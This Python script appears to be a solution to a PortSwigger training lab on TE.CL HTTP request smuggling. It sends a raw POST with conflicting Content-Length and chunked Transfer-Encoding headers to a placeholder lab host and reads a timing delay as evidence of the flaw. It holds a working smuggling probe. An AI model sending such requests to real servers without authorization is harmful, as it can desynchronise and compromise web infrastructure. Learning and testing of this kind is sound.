"""
Lab 2: HTTP request smuggling, basic TE.CL vulnerability
https://portswigger.net/web-security/request-smuggling/finding/lab-finding-basic-te-cl
Difficulty: Practitioner

📝 Front-end honors Transfer-Encoding, back-end uses Content-Length. Give a
Content-Length smaller than the full chunked body — the back-end stops
reading after that many bytes (mid-chunked-stream), and the real chunked
terminator + trailing data is left unread, dangling for the front-end to
wait on this time.
"""

from utils import send_raw, normalize_crlf, log, note

HOST = "YOUR-LAB-ID.web-security-academy.net"

PAYLOAD = normalize_crlf("""POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

8
X
0

""".format(host=HOST))


def run():
    note("Content-Length: 3 only covers '8\\r\\n' — the back-end (CL-based)")
    note("stops there; the rest of the chunked body is left unconsumed.")
    response, elapsed = send_raw(HOST, PAYLOAD, read_timeout=10)
    log(f"Elapsed: {elapsed:.2f}s")
    if elapsed > 5:
        log("Significant delay observed — consistent with TE.CL vulnerability.")
    else:
        log("No notable delay — try the CL.TE variant instead (Lab 1).", ok=False)


if __name__ == "__main__":
    run()
